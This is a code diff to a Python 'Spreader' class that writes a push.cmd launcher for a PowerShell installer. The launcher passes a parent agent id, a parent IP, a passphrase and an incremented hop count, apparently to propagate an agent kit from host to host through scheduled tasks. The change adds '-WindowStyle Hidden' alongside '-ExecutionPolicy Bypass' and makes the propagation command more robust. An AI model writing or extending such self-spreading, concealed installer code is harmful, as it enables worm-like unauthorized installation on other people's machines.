@@ -261,15 +261,26 @@ class Spreader:
 
             # push.cmd keeps the schtasks /TR line far below the 261-char limit
             # and is written on EVERY rebuild, never only on the first.
+            # Quotes inside a passphrase used to break the whole command.
+            def q(value: str) -> str:
+                return str(value).replace('"', '""')
+
+            local_ip = ""
+            try:
+                from . import discover as _disc
+                local_ip = _disc.local_ip() or ""
+            except Exception:
+                local_ip = ""
+
             with open(os.path.join(root, "push.cmd"), "w",
                       encoding="ascii", newline="\r\n") as handle:
                 handle.write(
                     "@echo off\r\n"
-                    'powershell -NoProfile -ExecutionPolicy Bypass '
+                    'powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass '
                     '-File "%~dp0install\\i.ps1" -Kit "%~dp0" '
-                    f'-Base "{base}" -Parent "{config.agent_id()}" '
-                    f'-ParentIp "{base}" -Room "{config.ROOM}" '
-                    f'-Pass "{config.PASSPHRASE}" -Hop {config.hop() + 1} -Quiet\r\n'
+                    f'-Base "{q(base)}" -Parent "{q(config.agent_id())}" '
+                    f'-ParentIp "{q(local_ip)}" -Room "{q(config.ROOM)}" '
+                    f'-Pass "{q(config.PASSPHRASE)}" -Hop {config.hop() + 1} -Quiet\r\n'
                 )
 
             with open(stamp, "w", encoding="utf-8") as handle:
